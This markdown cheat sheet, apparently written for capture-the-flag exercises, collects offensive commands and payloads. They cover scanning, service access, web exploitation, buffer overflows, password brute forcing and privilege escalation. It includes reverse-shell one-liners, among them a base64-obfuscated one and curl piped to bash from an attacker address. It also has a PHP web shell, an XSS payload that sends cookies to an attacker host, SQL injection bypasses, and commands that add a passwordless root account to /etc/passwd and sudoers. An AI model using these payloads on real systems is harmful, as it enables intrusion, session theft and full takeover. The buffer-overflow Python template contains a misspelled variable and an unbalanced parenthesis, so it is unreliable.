# CTF Cheat-Sheet

- [CTF Cheat-Sheet](#ctf-cheat-sheet)
  - [Resources](#resources)
  - [Nmap](#nmap)
  - [Protocols](#protocols)
  - [Shell](#shell)
    - [Reverse shell](#reverse-shell)
    - [Interactive shell](#interactive-shell)
      - [Linux](#linux)
      - [Windows](#windows)
  - [Crypto](#crypto)
  - [Web-Applications](#web-applications)
    - [SQL-Injection](#sql-injection)
    - [Cross-Site-Scripting](#cross-site-scripting)
    - [Server Side Template Injection](#server-side-template-injection)
    - [Local File Inclusion](#local-file-inclusion)
    - [File Upload](#file-upload)
    - [Regex Bypass](#regex-bypass)
    - [NoSQL-Injection](#nosql-injection)
  - [Buffer Overflow](#buffer-overflow)
    - [Stack Shellcode](#stack-shellcode)
    - [Ret2Libc](#ret2libc)
  - [Brute Force Login](#brute-force-login)
  - [Privilege Escalation](#privilege-escalation)
    - [Linux](#linux-1)
      - [system enumeration](#system-enumeration)
      - [sudo binaries](#sudo-binaries)
      - [writable pasword files](#writable-pasword-files)
      - [ssh](#ssh)
    - [Windows](#windows-1)
      - [system enumeration](#system-enumeration-1)
  - [Forensics](#forensics)
  - [Reverse Engineering](#reverse-engineering)
  - [Local web server](#local-web-server)


## Resources

- [Hacktricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)

## Nmap

```
nmap -vv -sV -sC -p- -Pn --min-rate 10000 -oN scan.txt <target-ip>
nmap -p- --script vuln <target-ip>
```
 
## Protocols

- ftp (21)
    ```
    ftp <ip>
    > put <local-file>
    > get <server-file>
    ```
- ssh (22)
    ```
    ssh <user>@<target-ip>
    ssh -i id_rsa <user>@<target-ip>
    ssh -L <lport>:127.0.0.1:<rport> <user>@<target-ip>
    ```
- dns (53)
	```
	dig axfr @<DNS_IP>
    dig axfr @<DNS_IP> <DOMAIN>
    dig ANY @<DNS_IP> <DOMAIN>
	dig -x <ip> @<DNS-IP>
	```
- smb (139/445)
    ```
    smbclient -L \\\\<target-ip>\\
    smbclient \\\\<target-ip>\\<share>
    > put <local-file>
    > get <server-file>
    
    enum4linux -a <url>
    ```
- redis (6379)
    ```
    redis-cli -h <target-ip>
    select 0
    keys *
    get <key>
    ```
- MSSQL (1433)
  - ``impacket`` -> ``mssqlclient.py``
  - ``mssqlclient.py <user>@<target-ip>``
  - ``mssqlclient.py <user>@<target-ip> -windows-auth``
  - shell with ``enable_xp_cmdshell``
  - run commands: ``xp_cmdshell <command>``
- mysql (3306)
	```
    mysql -h <target-ip> -u <user> -p
	show databases;
	use <db>;
	show tables;
    ```
- S3 Bucket:
    ```
    aws --endpoint=http://s3.<target> s3 ls s3://<target>
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    aws --endpoint=http://s3.<target> s3 cp shell.php s3://<target>
    ```

## Shell

### Reverse shell

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [revshells](https://www.revshells.com/)

```
#!/bin/bash
bash -i >& /dev/tcp/<your-ip>/<port> 0>&1
```
```
curl http://<your-ip>/shell.sh|bash
```
```
echo "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1" | base64
echo <base64-shell> | base64 -d | bash
{echo,<base64-shell>}|{base64,-d}|bash
```
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Listen for reverse shell with netcat:
```
nc -nvlp <port>
```

### Interactive shell

#### Linux

1. ``python -c 'import pty; pty.spawn("/bin/bash")'``
2. ``CTRL+Z``
3. ``stty raw -echo && fg``
4. ``ESC``

#### Windows

``rlwrap nc -nvlp <port>``

## Crypto

- [Cyber Chef](https://gchq.github.io/CyberChef/)
- [substitution cipher](https://www.guballa.de/substitution-solver)
- [vigenere](https://www.guballa.de/vigenere-solver)
- [ceasar](https://cryptii.com/pipes/caesar-cipher)
- ``hashid <hash>``: detect hash type
- password cracking: 
    ```sh
    john -w <wordlist> hash.txt
    hashcat -a 0 -m <hash-type> hash.txt <wordlist>
    hashcat -a 3 -m <hash-type> hash.txt <pattern>
    ```

## Web-Applications

- web directories and subdomains
    ```
    gobuster dir -u http://<target-ip> -w <wordlist> -x php,html
    gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
    ```
- ``/robots.txt`` and ``/sitemap.xml``
- view source
- view storage/cookies
- response headers
- ``whatweb <url>``: technologies used by a website
- ``nikto -h <url>``: web application vulnerabilities

### SQL-Injection

- authentication bypass
    ```
	' or 1=1 #
	' or '1'='1' #
	" or 1=1 --
	```
- sqlmap
    ```
    sqlmap -u "http://<target-ip>" --forms
    sqlmap -r request.txt --level 5 --risk 3 --batch
    sqlmap -u "http://<target-ip>" --os-shell
    ```

### Cross-Site-Scripting
    
```html
<script>alert("XSS")</script>
<img src=x onerror=this.src="http://<ip>:<port>/?cookie="+document.cookie>
```

### Server Side Template Injection

- input is reflected in response
- ``{{7*7}} => 49?``
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

### Local File Inclusion

- example: ``http://example.com/index.php?page=home.html``
- interesting files:
  - ``/etc/passwd``
  - ``/etc/apache2/sites-enabled/000-default.conf``: Apache configuration
  - ssh keys
  - web-app config files
- PHP backend $\Rightarrow$ PHP wrappers or log poisoning

### File Upload

- filters
  - file extension
  	- upload file with allowed extension and rename the file
  	- blacklist $\Rightarrow$ try alternative extensions like pht, php3, php4, ...
  	- double extension e.g. shell.php.jpg
  - Content-Type Header
  	- change header to allowed type
  - magic bytes
  	- change magic bytes in hex editor
- zip file upload
  - upload zip file with symlinks $\Rightarrow$ file read
  - write files with path traversal through file names e.g. file with name ``../../../../../root/.ssh/authorized_keys``
  - zip file upload and LFI and PHP backend $\Rightarrow$ phar injection

### Regex Bypass

Regex only checks first line $\Rightarrow$ put malicious payload in the seconde line
```
abc%0d%0a<script>alert("xss")</script>
abc%0d%0a{{7*7}}
```

### NoSQL-Injection

```
admin' || '1'=='1
```

## Buffer Overflow

- [pwntools](https://docs.pwntools.com/en/stable/)
- detect offset
	```
	msf-pattern_create -l 5000
	msf-pattern_create -l 5000 -q <pattern>
	```
- check protections
    ```
	checksec <binary>
	cat /proc/sys/kernel/randomize_va_space # ASLR
	```

### Stack Shellcode

- NX Stack, ASLR and Stack Canaries should be disabled
```bash
msf-venom -p linux/x64/shell_reverse/tcp LHOST=<host> LPORT=<port> --format py --bad-chars '\x00'
```
```python
payload_length = TODO # offset from pattern
buf = "" # insert msfvenom payload
nopsled = "\x90"*20 # adapt if necessary
pad = "A" * ((payload_length - len(nosled)) - len(buf)
rip = "<ADRESS>"[::-1] # little endian

print(nopsled + buf + pad + rip)
```

### Ret2Libc

- ASLR and Stack Canaries should be disabled
- get address of system function, of exit function and of the string ``/bin/sh``

## Brute Force Login

```
hydra -l <user> ftp://<target-ip> -P <wordlist>
hydra -l <user> -v -V -P <wordlist> <target-ip> ssh
hydra -V -F -l <user> -P <passwords> <target-ip> http-post-form "<path>:user=^USER^&pass=^PASS^:<failure-string>"
```

## Privilege Escalation

- metasploit: ``post/multi/recon/local_exploit_suggester``

### Linux

- [LinPEAS](https://github.com/carlospolop/PEASS-ng): automatically looks for privilege escalation vectors
- [pspy](https://github.com/DominicBreuker/pspy/releases): monitor processes

#### system enumeration

```
whoami
id
uname -a
ps aux | grep root
netstat -tulpn
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
history
env
echo $PATH
cat /etc/passwd | grep bash
ls -la /home/<user>/
find / -writable 2>/dev/null
crontab -l
```

#### sudo binaries

- [GTFOBins](https://gtfobins.github.io/)
- ``sudo -l``: list commands the current user can run as root
- ``find / -perm -u=s -type f 2>/dev/null``: SUID
    - files with *Set owner User ID* (SUID) flag
    - s flag is visible with ``ls -l``
    - executes file as the user who created it
    - try path hijacking: ``export PATH=/tmp:$PATH``
- ``find / -perm -g=s -type f 2>/dev/null``: SGID

#### writable pasword files

- ``/etc/passwd``
    ```
    echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
    su - root2
    ```
- ``/etc/shadow``
  1. ``python -c "import crypt; print crypt.crypt('NewRootPassword')"``
  2. ``nano /etc/shadow``
  3. Replace root's hash with the output that you generated
  4. ``su root``
- ``/etc/sudoers``
    ```
    echo "<user> ALL=(ALL:ALL) ALL" >> /etc/sudoers
    sudo su
    ```

#### ssh

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
1. Copy id_rsa contents of keys found with the above command
2. Create a local file on your box and paste the content in
3. ``chmod 600 id_rsa``
4. ``ssh -i id_rsa <user>@<ip>``

### Windows

- [winPEAS](https://github.com/peass-ng/PEASS-ng/releases)
- ``evil-winrm -i <target-ip> -u <user> -p <password>``: connect to the target

#### system enumeration

```
net users
net user <username>
whoami /priv
net localgroup
```

## Forensics

- ``file <file>``: determines the type of the file
- ``binwalk -e <file>``: extracts hidden files
- ``strings <file>``: prints the strings in the file
- ``tar -xvf <file>``: untars the tar file
- ``exiftool <file>``: prints metadata

## Reverse Engineering

- ``ltrace`` and ``strace``
- ``strings``
- ghidra

## Local web server

```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```
